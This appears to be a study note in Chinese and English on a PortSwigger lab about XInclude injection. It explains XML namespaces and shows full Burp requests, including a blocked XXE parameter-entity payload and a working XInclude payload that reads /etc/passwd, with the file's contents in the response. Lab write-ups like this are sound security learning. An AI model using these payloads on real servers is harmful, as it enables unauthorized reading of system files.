

教學:
https://www.youtube.com/watch?v=15LztMwbRR8&list=PLgZqc0esdeS8TkLr6T6EkDb1AfOz9VvkL&index=10


xinclude:
https://www.anquanke.com/post/id/156227
https://www.anquanke.com/post/id/156227?from=timeline
http://drops.xmd5.com/static/drops/tips-5290.html
https://zhuanlan.zhihu.com/p/389550468

xmlns:
https://www.w3schools.com/xml/xml_namespaces.asp
https://www.twblogs.net/a/5c1f9466bd9eee16b3daabe4










```
This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

Because you don't control the entire XML document you can't define a DTD to launch a classic [XXE](https://portswigger.net/web-security/xxe) attack.

To solve the lab, inject an `XInclude` statement to retrieve the contents of the `/etc/passwd` file.

#### Hint

By default, `XInclude` will try to parse the included document as XML. Since `/etc/passwd` isn't valid XML, you will need to add an extra attribute to the `XInclude` directive to change this behavior.

該實驗室具有“檢查庫存”功能，該功能將用戶輸入嵌入到隨後解析的服務器端 XML 文檔中。

因為您無法控制整個 XML 文檔，所以您無法定義 DTD 來發起經典的 [XXE](https://portswigger.net/web-security/xxe) 攻擊。

要解決實驗室問題，請注入 `XInclude` 語句來檢索 `/etc/passwd` 文件的內容。


＃＃＃＃ 暗示

默認情況下，`XInclude` 會嘗試將包含的文檔解析為 XML。 由於 `/etc/passwd` 不是有效的 XML，您需要在 `XInclude` 指令中添加一個額外的屬性來更改此行為。



```



完全不知道這題要幹嘛，直接看解答



solution:
```


1.  Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.


2.  Set the value of the `productId` parameter to:
    
    <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>




1. 訪問一個產品頁面，點擊“查看庫存”，在 Burp Suite 中攔截生成的 POST 請求。

2.將`productId`參數的值設置為：
    
     <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>



```






總結一下:

xmlns = xml name space 

```
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
```

foo 元素裡面說了， 只要是命名空間為xi 的元素為一識別URI  是 U R I  不是 url 


### 統一資源標識符 URI

https://zh.wikipedia.org/zh-tw/%E7%BB%9F%E4%B8%80%E8%B5%84%E6%BA%90%E6%A0%87%E5%BF%97%E7%AC%A6#:~:text=%E7%B5%B1%E4%B8%80%E8%B3%87%E6%BA%90%E6%A8%99%E8%AD%98%E7%AC%A6%EF%BC%88%E8%8B%B1%E8%AA%9E,%E7%82%BA%E9%9D%9E%E6%AD%A3%E5%BC%8F%E7%9A%84%E7%B6%B2%E5%9D%80%E3%80%82


雖然我們可以
```
<xi:table> 2 <xi:table>
<xi:chair> 4 <xi:chair>

```

但考慮到描述得不夠仔細，還是用了一個特別長的 xmlns 
這樣做，是為了唯一性，怕太簡單的ID 跟別人重複使用。

定義了 xi 的URI 後
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
```

再來看 include 元素
```
<xi:include parse="text" href="file:///etc/passwd"/>
```

其實相當於:

```
<http://www.w3.org/2001/XInclude:include parse="text" href="file:///etc/passwd"/>
```

這樣很長很難看。


include 中有兩個重要的屬性:

1.href
請求一個URL

2.parse
response 解析成什麼格式



重點就是 include 元素 會去包含一個文件，然後 response 給我們。


這題會用 xinclude 的原因是:


注入時，

```http

POST /product/stock HTTP/1.1
Host: 0a97009e03a1973cc094375200b80099.web-security-academy.net
Cookie: session=p8Qd8Y4aIpnJ3HKuCSNpykKPHGkuN1w4
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: */*
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://0a97009e03a1973cc094375200b80099.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 160
Origin: https://0a97009e03a1973cc094375200b80099.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

productId=<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>"> 
%eval; 
%exfil;
&storeId=1


```

response:

Entities 外部實體無法用
```http
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 47

"Entities are not allowed for security reasons"
```





換上payload
```http
POST /product/stock HTTP/1.1
Host: 0a97009e03a1973cc094375200b80099.web-security-academy.net
Cookie: session=p8Qd8Y4aIpnJ3HKuCSNpykKPHGkuN1w4
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: */*
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://0a97009e03a1973cc094375200b80099.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 132
Origin: https://0a97009e03a1973cc094375200b80099.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

productId=
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>

&storeId=1




```


至於 URI 為啥是http://www.w3.org/2001/XInclude ，這我也不懂，可能題目就要這個。

response:
```http
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 1281

"Invalid product ID: 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin


"
```


成功。